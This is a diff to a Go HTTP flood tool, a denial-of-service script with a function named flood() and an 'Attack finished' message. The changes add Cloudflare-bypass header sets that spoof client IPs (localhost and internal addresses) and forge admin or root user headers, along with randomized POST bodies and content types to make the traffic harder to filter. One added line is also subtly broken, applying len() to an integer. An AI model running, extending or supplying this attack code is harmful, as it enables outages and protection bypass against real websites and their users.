@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io"
 	"math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -31,7 +30,15 @@ var (
 	keepAlive       = true
 	attackRunning   = true
 	key             string
-	connCount       int32
+	postPayloads    []string
+	contentTypes    = []string{
+		"text/plain",
+		"application/octet-stream",
+		"application/json",
+		"application/xml",
+		"application/x-www-form-urlencoded",
+		"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
+	}
 
 	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -67,13 +74,13 @@ var (
 		"https://play.google.com/store/search?q=",
 	}
 
-	choice = []string{"Macintosh", "Windows", "X11"}
+	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
 	choice4 = []string{"Linux i686", "Linux x86_64"}
 	choice5 = []string{"chrome", "spider", "ie"}
 	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
-	spider = []string{
+	spider  = []string{
 		"AdsBot-Google (+http://www.google.com/adsbot.html)",
 		"Baiduspider (+http://www.baidu.com/search/spider.htm)",
 		"FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
@@ -97,17 +104,10 @@ var (
 	}
 
 	payloads = []string{
-		"?" + strings.Repeat("x", 65536),
-		"?" + strings.Repeat("y", 65536),
-		"?" + strings.Repeat("z", 65536),
-		"?" + strings.Repeat("a", 65536),
-	}
-
-	postPayloads = [][]byte{
-		[]byte(strings.Repeat("x", 65536)),
-		[]byte(strings.Repeat("y", 65536)),
-		[]byte(strings.Repeat("z", 65536)),
-		[]byte(strings.Repeat("a", 65536)),
+		"?" + strings.Repeat("x", 2048),
+		"?" + strings.Repeat("y", 4096),
+		"?" + strings.Repeat("z", 8192),
+		"?" + strings.Repeat("a", 16384),
 	}
 
 	cloudflareBypassHeaders = []map[string]string{
@@ -128,7 +128,15 @@ var (
 			"X-Forwarded-By":               "nginx",
 			"X-Forwarded-Server":           "google.com",
 			"X-Forwarded-Scheme":           "https",
-			"X-Forwarded-Forwarded-For":    "1.1.1.1",
+			"X-Forwarded-Forwarded-For":   "1.1.1.1",
+			"CF-IPCountry":                 "US",
+			"CF-Visitor":                   `{"scheme":"https"}`,
+			"CF-Request-ID":                generateRayID(),
+			"X-CSRF-Token":                 generateToken(),
+			"X-Request-Id":                 generateRayID(),
+			"X-Correlation-Id":             generateRayID(),
+			"X-Forwarded-User":             "admin",
+			"X-Forwarded-Account":          "superuser",
 		},
 		{
 			"CF-Connecting-IP":             "8.8.8.8",
@@ -147,39 +155,149 @@ var (
 			"X-Forwarded-By":               "apache",
 			"X-Forwarded-Server":           "cloudflare.com",
 			"X-Forwarded-Scheme":           "https",
-			"X-Forwarded-Forwarded-For":    "8.8.8.8",
+			"X-Forwarded-Forwarded-For":   "8.8.8.8",
+			"CF-IPCountry":                 "GB",
+			"CF-Visitor":                   `{"scheme":"http"}`,
+			"CF-Request-ID":                generateRayID(),
+			"X-CSRF-Token":                 generateToken(),
+			"X-Request-Id":                 generateRayID(),
+			"X-Correlation-Id":             generateRayID(),
+			"X-Forwarded-User":             "root",
+			"X-Forwarded-Account":          "administrator",
+		},
+		{
+			"CF-Connecting-IP":             "127.0.0.1",
+			"X-Forwarded-For":              "127.0.0.1",
+			"True-Client-IP":               "127.0.0.1",
+			"X-Real-IP":                    "127.0.0.1",
+			"X-Client-IP":                  "127.0.0.1",
+			"X-Originating-IP":             "127.0.0.1",
+			"X-Forwarded-Host":             "localhost",
+			"X-Host":                       "localhost",
+			"X-Forwarded-Proto":            "http",
+			"X-Forwarded-Protocol":         "http",
+			"X-Url-Scheme":                 "http",
+			"X-Forwarded-Ssl":              "off",
+			"X-Forwarded-Port":             "80",
+			"X-Forwarded-By":               "iis",
+			"X-Forwarded-Server":           "localhost",
+			"X-Forwarded-Scheme":           "http",
+			"X-Forwarded-Forwarded-For":   "127.0.0.1",
+			"CF-IPCountry":                 "RU",
+			"CF-Visitor":                   `{"scheme":"http"}`,
+			"CF-Request-ID":                generateRayID(),
+			"X-CSRF-Token":                 generateToken(),
+			"X-Request-Id":                 generateRayID(),
+			"X-Correlation-Id":             generateRayID(),
+			"X-Forwarded-User":             "system",
+			"X-Forwarded-Account":          "master",
+		},
+		{
+			"CF-Connecting-IP":             "192.168.1.1",
+			"X-Forwarded-For":              "192.168.1.1",
+			"True-Client-IP":               "192.168.1.1",
+			"X-Real-IP":                    "192.168.1.1",
+			"X-Client-IP":                  "192.168.1.1",
+			"X-Originating-IP":             "192.168.1.1",
+			"X-Forwarded-Host":             "intranet",
+			"X-Host":                       "intranet",
+			"X-Forwarded-Proto":            "https",
+			"X-Forwarded-Protocol":         "https",
+			"X-Url-Scheme":                 "https",
+			"X-Forwarded-Ssl":              "on",
+			"X-Forwarded-Port":             "443",
+			"X-Forwarded-By":               "traefik",
+			"X-Forwarded-Server":           "intranet",
+			"X-Forwarded-Scheme":           "https",
+			"X-Forwarded-Forwarded-For":   "192.168.1.1",
+			"CF-IPCountry":                 "CN",
+			"CF-Visitor":                   `{"scheme":"https"}`,
+			"CF-Request-ID":                generateRayID(),
+			"X-CSRF-Token":                 generateToken(),
+			"X-Request-Id":                 generateRayID(),
+			"X-Correlation-Id":             generateRayID(),
+			"X-Forwarded-User":             "internal",
+			"X-Forwarded-Account":          "service",
 		},
 	}
 
 	forbiddenRecoveryHeaders = []map[string]string{
 		{
-			"Cache-Control":                "no-transform",
-			"CDN-Loop":                     "cloudflare",
-			"CF-IPCountry":                 "US",
-			"CF-Ray":                       "mock-ray-id",
-			"CF-Visitor":                   `{"scheme":"https"}`,
-			"Origin":                       "null",
-			"Pragma":                       "no-cache",
-			"Sec-Fetch-Dest":               "document",
-			"Sec-Fetch-Mode":               "navigate",
-			"Sec-Fetch-Site":               "none",
-			"Sec-Fetch-User":               "?1",
-			"Upgrade-Insecure-Requests":    "1",
-			"Via":                          "1.1 google",
+			"Cache-Control":               "no-transform",
+			"CDN-Loop":                    "cloudflare",
+			"CF-IPCountry":                "US",
+			"CF-Ray":                      "mock-ray-id",
+			"CF-Visitor":                  `{"scheme":"https"}`,
+			"Origin":                      "null",
+			"Pragma":                      "no-cache",
+			"Sec-Fetch-Dest":              "document",
+			"Sec-Fetch-Mode":              "navigate",
+			"Sec-Fetch-Site":              "none",
+			"Sec-Fetch-User":              "?1",
+			"Upgrade-Insecure-Requests":   "1",
+			"Via":                         "1.1 google",
+			"X-Content-Type-Options":      "nosniff",
+			"X-Download-Options":          "noopen",
+			"X-Frame-Options":             "DENY",
+			"X-Permitted-Cross-Domain-Policies": "none",
+			"X-XSS-Protection":            "1; mode=block",
 		},
 		{
-			"Cache-Control":                "max-age=0",
-			"CDN-Loop":                     "fastly",
-			"CF-IPCountry":                 "GB",
-			"CF-Ray":                       "mock-ray-id-2",
-			"CF-Visitor":                   `{"scheme":"http"}`,
-			"Origin":                       host,
-			"Pragma":                       "public",
-			"Sec-Fetch-Dest":               "empty",
-			"Sec-Fetch-Mode":               "cors",
-			"Sec-Fetch-Site":               "same-origin",
-			"Upgrade-Insecure-Requests":    "0",
-			"Via":                          "1.1 varnish",
+			"Cache-Control":               "max-age=0",
+			"CDN-Loop":                    "fastly",
+			"CF-IPCountry":                "GB",
+			"CF-Ray":                      "mock-ray-id-2",
+			"CF-Visitor":                  `{"scheme":"http"}`,
+			"Origin":                      host,
+			"Pragma":                      "public",
+			"Sec-Fetch-Dest":              "empty",
+			"Sec-Fetch-Mode":              "cors",
+			"Sec-Fetch-Site":              "same-origin",
+			"Upgrade-Insecure-Requests":   "0",
+			"Via":                         "1.1 varnish",
+			"X-Content-Type-Options":      "nosniff",
+			"X-Download-Options":          "noopen",
+			"X-Frame-Options":             "SAMEORIGIN",
+			"X-Permitted-Cross-Domain-Policies": "master-only",
+			"X-XSS-Protection":            "1",
+		},
+		{
+			"Cache-Control":               "no-cache, no-store",
+			"CDN-Loop":                    "akamai",
+			"CF-IPCountry":                "DE",
+			"CF-Ray":                      "mock-ray-id-3",
+			"CF-Visitor":                  `{"scheme":"https"}`,
+			"Origin":                      "https://" + host,
+			"Pragma":                      "no-cache",
+			"Sec-Fetch-Dest":              "iframe",
+			"Sec-Fetch-Mode":              "nested-navigate",
+			"Sec-Fetch-Site":              "cross-site",
+			"Upgrade-Insecure-Requests":   "1",
+			"Via":                         "1.1 akamai",
+			"X-Content-Type-Options":      "nosniff",
+			"X-Download-Options":          "noopen",
+			"X-Frame-Options":             "ALLOW-FROM https://example.com",
+			"X-Permitted-Cross-Domain-Policies": "by-content-type",
+			"X-XSS-Protection":            "1; report=https://example.com/xss-report",
+		},
+		{
+			"Cache-Control":               "private",
+			"CDN-Loop":                    "cloudfront",
+			"CF-IPCountry":                "JP",
+			"CF-Ray":                      "mock-ray-id-4",
+			"CF-Visitor":                  `{"scheme":"http"}`,
+			"Origin":                      "http://" + host,
+			"Pragma":                      "cache",
+			"Sec-Fetch-Dest":              "object",
+			"Sec-Fetch-Mode":              "no-cors",
+			"Sec-Fetch-Site":              "same-site",
+			"Upgrade-Insecure-Requests":   "0",
+			"Via":                         "1.1 cloudfront",
+			"X-Content-Type-Options":      "nosniff",
+			"X-Download-Options":          "noopen",
+			"X-Frame-Options":             "ALLOWALL",
+			"X-Permitted-Cross-Domain-Policies": "all",
+			"X-XSS-Protection":            "0",
 		},
 	}
 )
@@ -200,13 +318,6 @@ func init() {
 			Renegotiation:      tls.RenegotiateOnceAsClient,
 			SessionTicketsDisabled: false,
 		},
-		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
-			atomic.AddInt32(&connCount, 1)
-			return tls.DialWithDialer(&net.Dialer{
-				Timeout:   15 * time.Second,
-				KeepAlive: 15 * time.Second,
-			}, network, addr, cfg)
-		},
 		ReadIdleTimeout:  time.Second * 30,
 		WriteByteTimeout: time.Second * 30,
 		PingTimeout:      time.Second * 15,
@@ -214,6 +325,12 @@ func init() {
 	httpClient = &http.Client{
 		Transport: http2Transport,
 		Timeout:   15 * time.Second,
+	}
+	for i := 0; i < 20; i++ {
+		size := rand.Intn(16384-8192) + 8192
+		buf := make([]byte, size)
+		rand.Read(buf)
+		postPayloads = append(postPayloads, string(buf))
 	}
 }
 
@@ -253,10 +370,6 @@ func getLargePayload() string {
 	return payloads[rand.Intn(len(payloads))]
 }
 
-func getPostPayload() []byte {
-	return postPayloads[rand.Intn(len(postPayloads))]
-}
-
 func applyCloudflareBypass(req *http.Request) {
 	headers := cloudflareBypassHeaders[rand.Intn(len(cloudflareBypassHeaders))]
 	for k, v := range headers {
@@ -275,6 +388,8 @@ func applyForbiddenRecovery(req *http.Request) {
 	for k, v := range headers {
 		if k == "CF-Ray" {
 			req.Header.Set(k, fmt.Sprintf("%s-%s", generateRayID(), "LAX"))
+		} else if k == "Origin" && v == "null" {
+			req.Header.Set(k, v)
 		} else {
 			req.Header.Set(k, v)
 		}
@@ -284,6 +399,15 @@ func applyForbiddenRecovery(req *http.Request) {
 func generateRayID() string {
 	const chars = "abcdef0123456789"
 	b := make([]byte, 16)
+	for i := range b {
+		b[i] = chars[rand.Intn(len(chars))]
+	}
+	return string(b)
+}
+
+func generateToken() string {
+	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, 32)
 	for i := range b {
 		b[i] = chars[rand.Intn(len(chars))]
 	}
@@ -303,7 +427,8 @@ func buildRequest(targetURL string) (*http.Request, error) {
 			getLargePayload()
 		req, err = http.NewRequest("GET", fullURL, nil)
 	} else {
-		req, err = http.NewRequest("POST", targetURL, strings.NewReader(string(getPostPayload())))
+		payload := postPayloads[rand.Intn(len(postPayloads))]
+		req, err = http.NewRequest("POST", targetURL, strings.NewReader(payload))
 	}
 
 	if err != nil {
@@ -322,8 +447,12 @@ func buildRequest(targetURL string) (*http.Request, error) {
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
 	req.Header.Set("DNT", "1")
 	req.Header.Set("TE", "Trailers")
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("Content-Length", strconv.Itoa(len(getPostPayload())))
+	
+	if mode == "post" {
+		contentType := contentTypes[rand.Intn(len(contentTypes))]
+		req.Header.Set("Content-Type", contentType)
+		req.Header.Set("Content-Length", strconv.Itoa(len(req.Body.(*strings.Reader).Size())))
+	}
 
 	applyCloudflareBypass(req)
 	applyForbiddenRecovery(req)
@@ -344,6 +473,8 @@ func flood(targetURL string) {
 			io.Copy(io.Discard, resp.Body)
 			resp.Body.Close()
 			atomic.AddInt64(&counter, 1)
+		} else {
+			time.Sleep(100 * time.Millisecond)
 		}
 	}
 }
@@ -406,16 +537,12 @@ func main() {
 
 	statsTicker := time.NewTicker(1 * time.Second)
 	defer statsTicker.Stop()
-	connTicker := time.NewTicker(5 * time.Second)
-	defer connTicker.Stop()
 	timeout := time.After(time.Duration(limit) * time.Second)
 
 	for {
 		select {
 		case <-statsTicker.C:
 			fmt.Printf("\rRequests sent: %d", atomic.LoadInt64(&counter))
-		case <-connTicker.C:
-			fmt.Printf("\nActive connections: %d\n", atomic.LoadInt32(&connCount))
 		case <-timeout:
 			attackRunning = false
 			fmt.Printf("\nAttack finished. Total requests: %d\n", atomic.LoadInt64(&counter))
